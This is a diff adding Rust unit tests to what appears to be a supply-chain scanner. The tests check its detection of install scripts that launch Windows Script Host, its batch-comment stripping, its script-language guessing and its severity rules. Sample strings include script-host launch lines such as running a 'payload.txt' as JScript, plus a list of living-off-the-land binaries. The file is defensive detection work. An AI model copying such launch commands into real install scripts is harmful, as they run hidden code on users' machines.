+            ("subprocess.run(['wscript', p])\n", Some("py"), "wscript p"),
+            ("subprocess.Popen(['cscript.exe', '//nologo', script])\n", Some("py"), "cscript.exe //nologo script"),
+            ("std::process::Command::new(\"cscript\").arg(\"x.vbs\").status();\n", None, "cscript x.vbs"),
+            ("cmd /c cscript //nologo x.vbs", None, "cscript //nologo x.vbs"),
+            ("@cscript //nologo x.vbs\r\n", None, "cscript //nologo x.vbs"),
+            ("if [ -f x ]; then cscript x.vbs; fi\n", None, "cscript x.vbs"),
+            ("wscript //E:jscript payload.txt", None, "wscript //E:jscript payload.txt"),
+        ] {
+            assert_eq!(launch(text, lang).as_deref(), Some(shown), "{text}");
+        }
+    }
+
+    #[test]
+    fn what_is_not_a_launch() {
+        for (text, lang) in [
+            ("console.log('On Windows, run cscript setup.vbs to finish');\n", Some("js")),
+            ("HELP = 'Usage: cscript tool.vbs [args]'\n", Some("py")),
+            ("echo please run cscript setup.vbs", None),
+            ("cscript\nx.vbs", None),
+            ("// cscript x.vbs\n", Some("js")),
+            ("const LOLBINS = ['mshta.exe', 'wscript.exe', 'cscript.exe'];\n", Some("js")),
+            ("node scripts/check-wscript.js", None),
+            ("node scripts/wscript.js", None),
+            ("x = shutil.which('cscript', path=p)\n", Some("py")),
+        ] {
+            assert_eq!(launch(text, lang), None, "{text}");
+        }
+    }
+
+    #[test]
+    fn a_batch_files_comments() {
+        let bare = |t: &str| bat_without_comments(&u(t)).map(|b| pystr::to_string(&b));
+        assert_eq!(bare("@echo off\r\nREM x\r\n  :: y\r\n@rem z\r\necho remark\r\n").as_deref(),
+                   Some("@echo off\r\n     \r\n      \r\n      \r\necho remark\r\n"));
+        assert_eq!(bare("echo hi\r\nremark.exe\r\n"), None); // `remark.exe` is a program, not a comment
+    }
+
+    #[test]
+    fn a_scripts_language_by_its_extension_or_its_shebang() {
+        let p = pack::current();
+        for (path, text, want) in [
+            ("install", "#!/bin/sh\n", None), ("bin/cli", "#!/usr/bin/env node\n", Some("js")), ("x.bash", "", None),
+            ("install.cmd", "", Some("bat")), ("SETUP.BAT", "", Some("bat")), ("x.ps1", "", Some("other")),
+            ("x.py", "", Some("py")), ("x.mts", "", Some("js")), ("install", "", Some("js")),
+            ("run", "#!/usr/bin/perl\n", Some("other")), (".hidden", "", Some("js")),
+        ] {
+            assert_eq!(crate::deps::script_lang(&p, &u(path), &u(text)), want, "{path}");
+        }
+    }
+
+    #[test]
+    fn severity_of_no_reasons() {
+        let p = pack::current();
+        assert_eq!(install_script_severity(&p, &[]), None);
+        assert_eq!(install_script_severity(&p, &[u("turns off TLS certificate verification")]), Some("MAJOR"));
     }
 }
